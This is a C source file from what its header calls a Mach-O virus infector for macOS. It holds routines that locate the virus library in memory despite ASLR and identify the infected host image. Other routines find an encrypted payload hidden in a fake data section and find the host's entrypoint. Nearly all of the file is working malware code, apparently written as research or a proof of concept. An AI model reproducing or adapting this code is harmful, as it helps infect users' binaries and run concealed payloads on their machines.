/*
 *        (`-.           _  .-')                .-')   ,---. 
 *     _(OO  )_        ( \( -O )              ( OO ). |   | 
 * ,--(_/   ,. \ ,-.-') ,------. ,--. ,--.   (_)---\_)|   | 
 * \   \   /(__/ |  |OO)|   /`. '|  | |  |   /    _ | |   | 
 *  \   \ /   /  |  |  \|  /  | ||  | | .-') \  :` `. |   | 
 *   \   '   /,  |  |(_/|  |_.' ||  |_|( OO ) '..`''.)|  .' 
 *    \     /__),|  |_.'|  .  '.'|  | | `-' /.-._)   \`--'  
 *     \   /   (_|  |   |  |\  \('  '-'(_.-' \       /.--.  
 *      `-'      `--'   `--' '--' `-----'     `-----' '--'  
 *
 * A mach-o virus infector
 *
 * Copyright (c) fG!, 2012,2013 - reverser@put.as - http://reverse.put.as
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 * find_functions.c
 *
 * Functions related to find different information we need from headers and memory
 *
 */

#include "find_functions.h"

#include <stdlib.h>
#include <sys/types.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>
#include <libgen.h>
#include <mach-o/dyld_images.h>
#include <mach-o/loader.h>
#include <mach-o/dyld.h>
#include <mach/mach.h>
#include <mach/mach_types.h>
#include <mach/mach_vm.h>

extern struct dyld_all_image_infos* _dyld_get_all_image_infos();

/*
 * find virus library name via LC_ID_DYLIB command
 * caller is responsible to free the virus name string
 */
void
find_library_name(virus_payload_info_t *virusInfo)
{
#if DEBUG
    printf("***** [%s] start *****\n", __FUNCTION__);
#endif
    // read the header
    struct mach_header *mh = (struct mach_header*)virusInfo->virusAddress;
    uint32_t headerSize = 0;
    
    if (mh->magic == MH_MAGIC) headerSize = sizeof(struct mach_header);
    else if (mh->magic == MH_MAGIC_64) headerSize = sizeof(struct mach_header_64);
    else return;
    
    // first load cmd location
    uint8_t *loadCmdAddress = virusInfo->virusAddress + headerSize;

    struct load_command *loadCommand = NULL;
    for (uint32_t i = 0; i < mh->ncmds; i++)
    {
        loadCommand = (struct load_command*)loadCmdAddress;
        if (loadCommand->cmd == LC_ID_DYLIB)
        {
            struct dylib_command *dylibCommand = (struct dylib_command*)loadCmdAddress;
            // basename returns ptr to internal space so we do not need to worry about free'ing it
            char *templibraryName = basename((char*)(loadCmdAddress+dylibCommand->dylib.name.offset));
            size_t libLen = strlen(templibraryName)+1;
            virusInfo->virusName = malloc(libLen);
            strlcpy(virusInfo->virusName, templibraryName, libLen);
#if DEBUG
            printf("[DEBUG] Library name xxxxxxx is %s\n", virusInfo->virusName);
#endif
            break;
        }
        loadCmdAddress += loadCommand->cmdsize;
    }
}

/*
 * find the address of our virus library by searching the start address of the library
 * compatible with random library names and ASLR
 */ 
uint8_t *
find_library_address_randomized(void)
{
#if DEBUG
    printf("***** [%s] start *****\n", __FUNCTION__);
#endif
    // get start address of this function
    int64_t search = (int64_t)&find_library_address_randomized;
    uint8_t *libAddress = NULL;
#if DEBUG
    printf("[%s] my own address %llx\n", __FUNCTION__, search);
#endif
    // start searching backwards for the header
    while (1)
    {
        // first we try to match __symbol_stub string (0x6e69727473635f5f)
        // we can't use the MAGIC constants because they are used elsewhere
        // __symbol_stub is not good because not present in 64bits
        // __stub_helper is common
        uint64_t currentData = *(uint64_t*)search;
        if (currentData == 0x685f627574735f5f)
        {
            break;
        }
        search -= 4;
        // XXX: add a stop condition?
    }
    // now that we have a location near the header, find the magic constants
    while (1)
    {
        uint32_t currentData = *(uint32_t*)search;
        if (currentData == MH_MAGIC || currentData == MH_MAGIC_64)
        {
            libAddress = (uint8_t*)search;
            break;
        }
        search -=4;
        // XXX: add a stop condition?
    }
    return libAddress;
}

/*
 * find the address of the infected library/binary
 * we iterate thru all image infos using dyld function
 * and try to find which one has the virus library configured on its header
 * the return value is the base address of that module
 */
void
find_infected_image_address(virus_payload_info_t *virusInfo)
{
#if DEBUG
    printf("***** [%s] start *****\n", __FUNCTION__);
#endif
    struct dyld_all_image_infos* dyldInfo = (struct dyld_all_image_infos*)_dyld_get_all_image_infos();
#if DEBUG
    printf("dyldInfo infoArrayCount: %d\n", dyldInfo->infoArrayCount);
#endif
    for (uint32_t i = 0 ; i < dyldInfo->infoArrayCount; i++)
    {
        uint8_t *tempBuffer = (uint8_t*)dyldInfo->infoArray[i].imageLoadAddress;
        struct mach_header *mh = (struct mach_header*)tempBuffer;
        uint32_t headerSize = 0;
        if (mh->magic == MH_MAGIC) headerSize = sizeof(struct mach_header);
        else if (mh->magic == MH_MAGIC_64) headerSize = sizeof(struct mach_header_64);
        else return;
        
        // first load cmd address
        uint8_t *address = (uint8_t*)tempBuffer + headerSize;

        struct load_command *loadCommand = NULL;
        for (uint32_t x = 0; x < mh->ncmds; x++)
        {
            loadCommand = (struct load_command*)address;
            if (loadCommand->cmd == LC_LOAD_DYLIB)
            {
                struct dylib_command *dylibCommand = (struct dylib_command*)address;
                //                printf("Lib name%s\n", (char*)(tempBuffer+dylibCommand->dylib.name.offset));
                char *currentLibName = basename((char*)(address+dylibCommand->dylib.name.offset));
                //                printf("Current libname %s vs %s\n", currentLibName, myName);
                // match the basename and verify if @executable_path is in the header name
                // this should reduce chances of a collision with the library name
                // since we are using a valid name, so a binary could be linked against it
                if (strcmp(currentLibName, virusInfo->virusName) == 0 &&
                    strstr((char*)(address+dylibCommand->dylib.name.offset),"@executable_path"))
                {
#if DEBUG
                    printf("[DEBUG] found infected image: %s\n", dyldInfo->infoArray[i].imageFilePath);
#endif
                    // store this image index so we can retrieve the ASLR slide later
                    virusInfo->infectedImageIndex = i;
                    virusInfo->infectedImage = (uint8_t*)dyldInfo->infoArray[i].imageLoadAddress;
                    return;
                }
            }
            address += loadCommand->cmdsize;
        }
    }
    virusInfo->infectedImage = NULL;
}

/*
 * find the fake section inside the virus library that contains information of the crypted data
 * and read those fields - offset into LINKEDIT and size
 */
void
find_encrypted_payload(virus_payload_info_t *virusInfo)
{
#if DEBUG
    printf("***** [%s] start *****\n", __FUNCTION__);
#endif
    // read the header
    struct mach_header *mh = (struct mach_header*)virusInfo->virusAddress;
    uint32_t headerSize = 0;
    uint8_t *address    = NULL;
    uint8_t is64bits    = 0;
    
    if (mh->magic == MH_MAGIC)
    {
        headerSize = sizeof(struct mach_header);
    }
    else if (mh->magic == MH_MAGIC_64)
    {
        is64bits = 1;
        headerSize = sizeof(struct mach_header_64);
    }
    else return;
    
    // first load cmd address
    address = (uint8_t*)virusInfo->virusAddress + headerSize;

    struct load_command *loadCommand = NULL;
    struct section *fakeSection = NULL;
    struct section_64 *fakeSection64 = NULL;
    uint64_t linkeditAddr = 0;
    uint64_t linkeditOffset = 0;
    
    for (uint32_t i = 0; i < mh->ncmds; i++)
    {
        loadCommand = (struct load_command*)address;
        // 32bits
        if (loadCommand->cmd == LC_SEGMENT)
        {
            struct segment_command *segmentCommand = (struct segment_command*)address;
            // store the offset location in DATA segment
            if (strncmp(segmentCommand->segname, "__DATA", 16) == 0)
            {
                struct section *sectionCommand = (struct section*)(address + sizeof(struct segment_command));
                for (uint32_t x = 0; x < segmentCommand->nsects; x++)
                {
                    // FIXME: encode the string
                    if (strncmp(sectionCommand->sectname, "__ln_symbol_ptr", 16) == 0)
                    {
                        // store pointer to this section so we can modify it later
                        // we can't modify it here because we might not have the LINKEDIT information
                        // LINKEDIT command is usually after the __DATA command
                        fakeSection = sectionCommand;
                    }
                    sectionCommand++;
                }
            }
            else if (strncmp(segmentCommand->segname, "__LINKEDIT", 16) == 0)
            {
                linkeditAddr = segmentCommand->vmaddr;
                linkeditOffset = segmentCommand->fileoff;
            }
        }
        else if (loadCommand->cmd == LC_SEGMENT_64)
        {
            struct segment_command_64 *segmentCommand = (struct segment_command_64*)address;
            // store the offset location in DATA segment
            if (strncmp(segmentCommand->segname, "__DATA", 16) == 0)
            {
                struct section_64 *sectionCommand = (struct section_64*)(address + sizeof(struct segment_command_64));
                for (uint32_t x = 0; x < segmentCommand->nsects; x++)
                {
                    // FIXME: encode the string
                    if (strncmp(sectionCommand->sectname, "__ln_symbol_ptr", 16) == 0)
                    {
                        // store pointer to this section so we can modify it later
                        // we can't modify it here because we might not have the LINKEDIT information
                        // LINKEDIT command is usually after the __DATA command
                        fakeSection64 = sectionCommand;
                    }
                    sectionCommand++;
                }
            }
            else if (strncmp(segmentCommand->segname, "__LINKEDIT", 16) == 0)
            {
                linkeditAddr = segmentCommand->vmaddr;
                linkeditOffset = segmentCommand->fileoff;
            }
        }
        // advance to next command, size field holds the total size of each command, including sections
        address += loadCommand->cmdsize;
    }
    uint64_t decryptSize = 0;
    uint64_t decryptOffset = 0;
    if (is64bits)
    {
        if (fakeSection64 != NULL)
        {
            decryptSize = fakeSection64->size;
            decryptOffset = fakeSection64->offset;
        }
    }
    else
    {
        if (fakeSection != NULL)
        {
            decryptSize = fakeSection->size;
            decryptOffset = fakeSection->offset;
        }
    }
#if DEBUG
    printf("Fake section offset %llx size %llx\n", decryptOffset, decryptSize);
    // read the crypted bytes from LINKEDIT
    printf("Linkedit vm addr is %llx\n", (uint64_t)(virusInfo->virusAddress + linkeditAddr));
    printf("crypted bytes %x\n", *(uint32_t*)(virusInfo->virusAddress + linkeditAddr + (decryptOffset-linkeditOffset)));
#endif
    virusInfo->payloadLocation = (uint8_t*)(virusInfo->virusAddress + linkeditAddr + (decryptOffset-linkeditOffset));
    virusInfo->payloadSize = decryptSize;
}

/*
 * find the entrypoint of a given mach-o image
 */
uint8_t *
find_entrypoint(uint8_t *targetAddress)
{
#if DEBUG
    printf("***** [%s] start *****\n", __FUNCTION__);
#endif
    // read the header
    struct mach_header *mh = (struct mach_header*)targetAddress;
    uint32_t headerSize = 0;
    uint8_t *address    = NULL;
    
    if (mh->magic == MH_MAGIC) headerSize = sizeof(struct mach_header);
    else if (mh->magic == MH_MAGIC_64) headerSize = sizeof(struct mach_header_64);
    else return NULL;
    
    // first load cmd address
    address = (uint8_t*)targetAddress + headerSize;

    struct load_command *loadCommand = NULL;
    uint8_t *entrypoint = NULL;
    
    for (uint32_t i = 0; i < mh->ncmds; i++)
    {
        loadCommand = (struct load_command*)address;
        // 32bits
        if (loadCommand->cmd == LC_UNIXTHREAD)
        {
            thread_command_t *threadCommand = (thread_command_t*)address;
            // XXX: we might need to distinguish the ARM case in the future
            switch (threadCommand->flavor)
            {
                case x86_THREAD_STATE32:
                {
                    entrypoint = (uint8_t*)((x86_thread_state32_t*)(address+sizeof(thread_command_t)))->__eip;
                    break;
                }
                case x86_THREAD_STATE64:
                {
                    entrypoint = (uint8_t*)((x86_thread_state64_t*)(address+sizeof(thread_command_t)))->__rip;
                    break;
                }
            }
        }
        // the new entrypoint for 10.8.x binaries
        // XXX: needs to be fixed
        else if (loadCommand->cmd == LC_MAIN)
        {
            struct entry_point_command *entryPointCmd = (struct entry_point_command*)address;
//            entrypoint = entryPointCmd->entryoff;
        }
        // advance to next command, size field holds the total size of each command, including sections
        address += loadCommand->cmdsize;
    }
    // Don't forget the ASLR slide because the info at the header isn't updated with this
    // FIXME: for now assume image index is 0, which should be always true
    // but we can do better than this - just find the right image index to be safe
    uint64_t aslrslide = _dyld_get_image_vmaddr_slide(0);
#if DEBUG
    printf("Target entrypoint is %llx\n", (uint64_t)(entrypoint+aslrslide));
#endif
    return entrypoint+aslrslide;
}

#pragma mark Unused functions

/*
 * find the address of our virus library using the loaded images
 * not compatible with random library names, unless we store the name somewhere
 * this will be ASLR compatible
 */
uint8_t *
find_library_address(void)
{
#if DEBUG
    printf("***** [%s] start *****\n", __FUNCTION__);
#endif
    struct dyld_all_image_infos* dyldInfo = (struct dyld_all_image_infos*)_dyld_get_all_image_infos();
    uint8_t *libAddress = NULL;
#if DEBUG
    printf("dyldInfo infoArrayCount: %d\n", dyldInfo->infoArrayCount);
#endif
    for (uint32_t i = 0 ; i < dyldInfo->infoArrayCount; i++)
    {
#if DEBUG
        printf("%d - %s at 0x%x\n", i, dyldInfo->infoArray[i].imageFilePath, (uint32_t)dyldInfo->infoArray[i].imageLoadAddress);
#endif
        // FIXME: encode the string
        if (strstr(dyldInfo->infoArray[i].imageFilePath, "virus.dylib"))
        {
#if DEBUG
            printf("Found library %s at 0x%llx\n", dyldInfo->infoArray[i].imageFilePath, (uint64_t)dyldInfo->infoArray[i].imageLoadAddress);
#endif
            libAddress = (uint8_t*)dyldInfo->infoArray[i].imageLoadAddress;
            break;
        }
    }
    find_library_address_randomized();
    return libAddress;
}

/*
 find the memory address where we have a first valid mach-o, starting at startAddr
 returns on addr and size parameters
 */
uint32_t 
find_machoimage(uint64_t *addr, uint64_t *size, uint64_t startAddr)
{
#if DEBUG
    printf("***** [%s] start *****\n", __FUNCTION__);
#endif
	kern_return_t kr = 0;
	mach_vm_address_t address = startAddr;
	mach_vm_size_t lsize = 0;
	uint32_t depth = 1;
	mach_msg_type_number_t bytesRead = 0;
	vm_offset_t magicNumber = 0;
    task_t targetTask = mach_task_self();
	while (1) 
	{
		struct vm_region_submap_info_64 info;
		mach_msg_type_number_t count = VM_REGION_SUBMAP_INFO_COUNT_64;
		kr = vm_region_recurse_64(targetTask, (vm_address_t*)&address, (vm_size_t*)&lsize, &depth, (vm_region_info_64_t)&info, &count);
		if (kr == KERN_INVALID_ADDRESS)
		{
			break;
		}
		if (info.is_submap)
		{
			depth++;
		}
		else 
		{
			//do stuff
#if DEBUG
            //			printf ("[DEBUG] find_image Found region: %p to %p\n", (void*)address, (void*)address+lsize);
#endif
			// try to read first 4 bytes            
			kr = mach_vm_read(targetTask, (mach_vm_address_t)address, (mach_vm_size_t)4, &magicNumber, &bytesRead);
			// avoid deferencing an invalid memory location (for example PAGEZERO segment)
			if (kr == KERN_SUCCESS & bytesRead == 4)
			{
				// verify if it's a mach-o binary at that memory location
                // we can also verify the type
				if (*(uint32_t*)magicNumber == MH_MAGIC ||
					*(uint32_t*)magicNumber == MH_MAGIC_64)
				{
#if DEBUG
                    printf("[DEBUG] find_image Found a valid mach-o image @ %p!\n", (void*)address);
#endif
					*addr = address;
					*size = lsize;
					break;
				}
			}
			address += lsize;
		}
	}
	return 0;
}
